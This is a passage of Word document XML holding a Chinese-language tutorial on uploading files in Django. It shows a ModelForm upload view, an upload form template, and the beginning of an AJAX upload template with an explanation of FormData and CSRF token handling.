        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .forms import FileUploadForm, FileUploadModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74EB3996" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CC755D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>import uuid</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD26B79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.http import JsonResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73323F71" w14:textId="503D93BA" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.template.defaultfilters import filesizeformat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51025F7C" w14:textId="691E7363" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="0047302B">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F545BF3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Upload File with ModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54003A79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def model_form_upload(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A2C8CE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="646FBDBA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = FileUploadModelForm(request.POST, request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="629C3C90" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F91714B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            form.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD0E912" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return redirect("/file/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54106B54" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304B172E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = FileUploadModelForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F10FA54" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71F1B446" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'file_upload/upload_form.html', {'form': form,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5872A2" w14:textId="29606439" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">                                                            'heading': 'Upload files with ModelForm'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F32AD15" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上传表单模板也是upload_form.html，和前例供用的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3626DE9D"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#file_upload/templates/upload_form.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A43B1B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "file_upload/base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E2C2DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421DDC7C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if heading %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D78A26" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;{{ heading }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1002F4B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CA10C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form action="" method="post" enctype="multipart/form-data" &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38890840" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E936C7B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  {{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F13497" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;button class="btn btn-info form-control " type="submit" value="submit"&gt;Upload&lt;/button&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BEFD6E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C36FAAA" w14:textId="757B5028" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A84CED" w14:textId="3E8AAD12" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>显示效果如下所示:</w:t>
      </w:r>
      <w:r w:rsidR="0047302B">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509BEA6D" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用Ajax上传文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="087D38A2" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用Ajax上传文件的好处是，你上传文件后无需刷新页面或跳转即可立刻显示新上传的文件信息(如下所示)。Ajax应用场景还是非常普遍的，比如用户上传头像后无需刷新实时显示新上传的头像。或则用户添加评论后无需刷新页面直接显示新增的评论。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A97C350" w14:textId="372537DD" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B2CC642" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>AJAX文件上传代码最重要的部分在前端（代码如下所示)。我们构建了FormData对象，添加了file和upload_method, 并通过设置processData=False告诉jQuery不要处理上传的文件，交由后台处理。由于发送POST请求还需要提供csrftoken，我们还通过jQuery的cookie库获取crsftoken，添加到请求头里，一起发到服务器上。如果后台返回的data没有error_msg, 就显示后台返回的更新过的文件清单。处理ajax的请求地址是/file/ajax_upload/, 对应的视图方法是ajax_upload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FBE7E8F"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#file_upload/templates/ajax_upload_form.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B9AA3F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "file_upload/base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0866D501" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4670B740" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56EB30C4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if heading %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BFC7F9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;{{ heading }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A64156" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F8C31C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F5A3B3F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form action="" method="post" enctype="multipart/form-data" id="form"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1B4377" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;ul class="errorlist"&gt;&lt;/ul&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74545E7B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    {% csrf_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0AD762" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ form.as_p }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B1D232" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;input type="button" class="btn btn-info form-control" value="submit" id="btn" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A2C5FF2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FDF5A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;table class="table table-striped" id="result"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57AEE425" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;/table&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8BFAC9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
